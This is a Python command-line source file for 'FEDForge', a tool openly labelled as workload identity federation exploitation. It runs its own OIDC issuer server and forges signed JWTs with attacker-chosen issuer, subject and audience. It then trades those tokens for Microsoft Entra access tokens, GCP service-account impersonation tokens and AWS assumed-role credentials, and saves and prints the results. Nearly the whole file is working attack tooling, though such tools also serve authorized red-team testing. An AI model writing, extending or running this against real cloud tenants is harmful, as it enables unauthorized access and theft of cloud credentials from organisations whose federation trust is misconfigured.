#!/usr/bin/env python3
import click
import json
from pathlib import Path
from cryptography.hazmat.primitives import serialization
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

from server import create_server, KeyManager
from client import TokenForge, TokenExchangeEntra, TokenExchangeGCP, TokenExchangeAWS

console = Console()


@click.group()
@click.version_option(version="0.1.0")
def cli():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║                        FEDForge                           ║
    ║         Workload Identity Federation Exploitation         ║
    ║                                                           ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    console.print(banner, style="bold cyan")


@cli.group()
def server():
    pass


@server.command()
@click.option('--host', default='0.0.0.0', help='Host to bind to')
@click.option('--port', default=8080, type=int, help='Port to listen on')
@click.option('--issuer', help='Public issuer URL')
@click.option('--key-dir', default='./keys', help='Directory for RSA keys')
@click.option('--debug', is_flag=True, help='Enable debug mode')
def start(host, port, issuer, key_dir, debug):
    try:
        if issuer:
            console.print(f"[cyan]Using custom issuer: {issuer}[/cyan]")
        else:
            console.print(f"[yellow]No issuer specified, using default: http://{host}:{port}[/yellow]")
            console.print("[yellow]Note: For Tailscale/Cloudflare Tunnels, use --issuer with your public URL[/yellow]\n")

        oidc_server = create_server(host=host, port=port, key_dir=key_dir, issuer=issuer)
        oidc_server.run(debug=debug)
    except KeyboardInterrupt:
        console.print("\n[yellow]Server stopped by user[/yellow]")
    except Exception as e:
        console.print(f"[red]Error starting server: {e}[/red]")


@cli.group()
def token():
    pass


@token.command()
@click.option('--issuer', required=True, help='Issuer URL (your OIDC provider)')
@click.option('--subject', default='system:serviceaccount:default:fedforge', help='Subject identifier (default: system:serviceaccount:default:fedforge)')
@click.option('--audience', default='api://AzureADTokenExchange', help='Token audience (default: api://AzureADTokenExchange)')
@click.option('--lifetime', default=3600, type=int, help='Token lifetime in seconds (default: 3600)')
@click.option('--claims', help='Additional claims as JSON string')
@click.option('--key-dir', default='./keys', help='Directory containing RSA keys')
@click.option('--output', '-o', help='Save token to file')
def create(issuer, subject, audience, lifetime, claims, key_dir, output):
    try:
        key_manager = KeyManager(key_dir=key_dir)
        private_key = key_manager.get_private_key()

        additional_claims = None
        if claims:
            try:
                additional_claims = json.loads(claims)
            except json.JSONDecodeError:
                console.print("[red]Error: Invalid JSON in --claims[/red]")
                return

        forge = TokenForge(private_key, kid=key_manager.kid)

        console.print("\n[cyan]Forging token...[/cyan]")
        console.print(f"[cyan]Token lifetime: {lifetime} seconds ({lifetime // 3600}h {(lifetime % 3600) // 60}m)[/cyan]")
        jwt_token = forge.create_token(
            issuer=issuer,
            subject=subject,
            audience=audience,
            additional_claims=additional_claims,
            lifetime=lifetime
        )

        forge.print_token_info(jwt_token)

        console.print("[green] Token created successfully![/green]\n")
        console.print(Panel(jwt_token, title="JWT Token", border_style="green"))

        if output:
            Path(output).write_text(jwt_token)
            console.print(f"\n[green]Token saved to {output}[/green]")

    except Exception as e:
        console.print(f"[red]Error creating token: {e}[/red]")


@token.command()
@click.argument('token')
@click.option('--verify', is_flag=True, help='Verify signature (requires public key)')
@click.option('--key-dir', default='./keys', help='Directory containing the public key')
def decode(token, verify, key_dir):
    try:
        if token.startswith('@'):
            token_file = token[1:]
            token = Path(token_file).read_text().strip()

        forge = TokenForge(None)

        if verify:
            public_key_path = Path(key_dir) / "public.pem"
            public_key = serialization.load_pem_public_key(public_key_path.read_bytes())
            forge.decode_token(token, verify=True, public_key=public_key)
            console.print(f"[green]Signature verified with {public_key_path}[/green]")

        forge.print_token_info(token)

    except Exception as e:
        raise click.ClickException(f"Error decoding token: {e}") from e


@cli.group()
def keys():
    pass


@keys.command()
@click.option('--key-dir', default='./keys', help='Directory for RSA keys')
def generate(key_dir):
    try:
        key_manager = KeyManager(key_dir=key_dir)
        private_key, public_key = key_manager.generate_keys()

        console.print("[green] RSA key pair generated successfully![/green]")
        console.print(f"[cyan]Private key: {key_manager.private_key_path}[/cyan]")
        console.print(f"[cyan]Public key: {key_manager.public_key_path}[/cyan]")

        jwks = key_manager.get_jwks(public_key)
        console.print("\n[yellow]JWKS (for reference):[/yellow]")
        jwks_json = json.dumps(jwks, indent=2)
        syntax = Syntax(jwks_json, "json", theme="monokai")
        console.print(syntax)

    except Exception as e:
        console.print(f"[red]Error generating keys: {e}[/red]")


@keys.command()
@click.option('--key-dir', default='./keys', help='Directory containing RSA keys')
def show(key_dir):
    try:
        key_manager = KeyManager(key_dir=key_dir)
        _, public_key = key_manager.load_keys()

        console.print(f"[cyan]Key Directory: {key_manager.key_dir}[/cyan]")
        console.print(f"[cyan]Key ID: {key_manager.kid}[/cyan]")

        jwks = key_manager.get_jwks(public_key)
        console.print("\n[yellow]JWKS:[/yellow]")
        jwks_json = json.dumps(jwks, indent=2)
        syntax = Syntax(jwks_json, "json", theme="monokai")
        console.print(syntax)

    except Exception as e:
        console.print(f"[red]Error loading keys: {e}[/red]")


@cli.group()
def entra():
    pass


@entra.command()
@click.option('--token', required=True, help='JWT token (or file path starting with @)')
@click.option('--tenant-id', required=True, help='Microsoft Entra tenant ID')
@click.option('--client-id', required=True, help='App Registration client ID')
@click.option('--scope', default='https://graph.microsoft.com/.default', help='Token scope')
@click.option('--output', '-o', help='Save access token to file (default: entra-access-token.jwt)')
def exchange(token, tenant_id, client_id, scope, output):
    try:
        if token.startswith('@'):
            token_file = token[1:]
            token = Path(token_file).read_text().strip()
            console.print(f"[cyan]Loaded token from {token_file}[/cyan]")

        exchanger = TokenExchangeEntra()

        result = exchanger.exchange(
            federated_token=token,
            tenant_id=tenant_id,
            client_id=client_id,
            scope=scope
        )

        if result['success']:
            output_file = output if output else "entra-access-token.jwt"
            exchanger.save_token(result, output_file)
            console.print(f"\n[green] Access token saved to: {output_file}[/green]")
            console.print("\n[green]Access Token:[/green]")
            console.print(Panel(result['access_token'], border_style="green"))

        else:
            console.print("[red]Token exchange failed. See error above.[/red]")

    except Exception as e:
        console.print(f"[red]Error during exchange: {e}[/red]")


@cli.group()
def gcp():
    pass


@gcp.command()
@click.option('--token', required=True, help='JWT token (or file path starting with @)')
@click.option('--project-number', required=True, help='GCP project number (NOT project ID)')
@click.option('--pool-id', required=True, help='Workload Identity Pool ID')
@click.option('--provider-id', required=True, help='Workload Identity Provider ID')
@click.option('--service-account', required=True, help='Service account email to impersonate')
@click.option('--scope', default='https://www.googleapis.com/auth/cloud-platform', help='Token scope')
@click.option('--output', '-o', help='Save access token to file (default: gcp-access-token.jwt)')
def exchange(token, project_number, pool_id, provider_id, service_account, scope, output):
    try:
        if token.startswith('@'):
            token_file = token[1:]
            token = Path(token_file).read_text().strip()
            console.print(f"[cyan]Loaded token from {token_file}[/cyan]")

        exchanger = TokenExchangeGCP()

        result = exchanger.exchange(
            federated_token=token,
            project_number=project_number,
            pool_id=pool_id,
            provider_id=provider_id,
            service_account=service_account,
            scope=scope
        )

        if result['success']:
            output_file = output if output else "gcp-access-token.jwt"
            exchanger.save_token(result, output_file)
            console.print(f"\n[green] Access token saved to: {output_file}[/green]")

            console.print("\n[green]Access Token:[/green]")
            console.print(Panel(result['access_token'], border_style="green"))
        else:
            console.print(f"[red]Exchange failed[/red]")

    except Exception as e:
        console.print(f"[red]Error during exchange: {e}[/red]")


@gcp.command('exchange-sts')
@click.option('--token', required=True, help='JWT token (or file path starting with @)')
@click.option('--project-number', required=True, help='GCP project number (NOT project ID)')
@click.option('--pool-id', required=True, help='Workload Identity Pool ID')
@click.option('--provider-id', required=True, help='Workload Identity Provider ID')
@click.option('--output', '-o', help='Save STS token to file (default: gcp-sts-token.json)')
def exchange_sts(token, project_number, pool_id, provider_id, output):
    try:
        if token.startswith('@'):
            token_file = token[1:]
            token = Path(token_file).read_text().strip()
            console.print(f"[cyan]Loaded token from {token_file}[/cyan]")

        exchanger = TokenExchangeGCP()

        result = exchanger.exchange_for_sts_token(
            federated_token=token,
            project_number=project_number,
            pool_id=pool_id,
            provider_id=provider_id
        )

        if result['success']:
            output_file = output if output else "gcp-sts-token.json"
            exchanger.save_token(result, output_file)
            console.print(f"\n[green] STS token saved to: {output_file}[/green]")
            console.print(f"[cyan]Expires In: {result.get('expires_in')} seconds[/cyan]")
        else:
            console.print(f"[red]STS exchange failed[/red]")

    except Exception as e:
        console.print(f"[red]Error during STS exchange: {e}[/red]")


@gcp.command('exchange-sa')
@click.option('--sts-token', required=True, help='STS token (or file path starting with @)')
@click.option('--service-account', required=True, help='Service account email to impersonate')
@click.option('--scope', default='https://www.googleapis.com/auth/cloud-platform', help='Token scope')
@click.option('--output', '-o', help='Save access token to file (default: gcp-access-token.jwt)')
def exchange_sa(sts_token, service_account, scope, output):
    try:
        if sts_token.startswith('@'):
            token_file = sts_token[1:]
            file_content = Path(token_file).read_text().strip()
            try:
                token_data = json.loads(file_content)
                sts_token = token_data.get('access_token', file_content)
            except json.JSONDecodeError:
                sts_token = file_content
            console.print(f"[cyan]Loaded STS token from {token_file}[/cyan]")

        exchanger = TokenExchangeGCP()

        result = exchanger.exchange_for_sa_token(
            sts_token=sts_token,
            service_account=service_account,
            scope=scope
        )

        if result['success']:
            output_file = output if output else "gcp-access-token.jwt"
            exchanger.save_token(result, output_file)
            console.print(f"\n[green] Access token saved to: {output_file}[/green]")

            console.print("\n[green]Access Token:[/green]")
            console.print(Panel(result['access_token'], border_style="green"))
        else:
            console.print(f"[red]SA exchange failed[/red]")

    except Exception as e:
        console.print(f"[red]Error during SA exchange: {e}[/red]")


@cli.group()
def aws():
    pass


@aws.command()
@click.option('--token', required=True, help='JWT token (or file path starting with @)')
@click.option('--role-arn', required=True, help='AWS IAM role ARN to assume')
@click.option('--session-name', default='fedforge-session', help='AWS session name')
@click.option('--output', '-o', help='Save credentials to file (default: aws-credentials.json)')
def exchange(token, role_arn, session_name, output):
    try:
        if token.startswith('@'):
            token_file = token[1:]
            token = Path(token_file).read_text().strip()
            console.print(f"[cyan]Loaded token from {token_file}[/cyan]")

        exchanger = TokenExchangeAWS()

        result = exchanger.exchange(
            federated_token=token,
            role_arn=role_arn,
            session_name=session_name
        )

        if result['success']:
            output_file = output if output else "aws-credentials.json"
            if exchanger.save_token(result, output_file):
                console.print(f"\n[green] Credentials saved to: {output_file}[/green]")

            console.print("\n[green]AWS Credentials:[/green]")
            console.print(Panel(json.dumps(result, indent=2), border_style="green"))
        else:
            console.print(f"[red]{result.get('error_description', 'AWS token exchange failed')}[/red]")

    except Exception as e:
        console.print(f"[red]Error during exchange: {e}[/red]")


if __name__ == '__main__':
    cli()
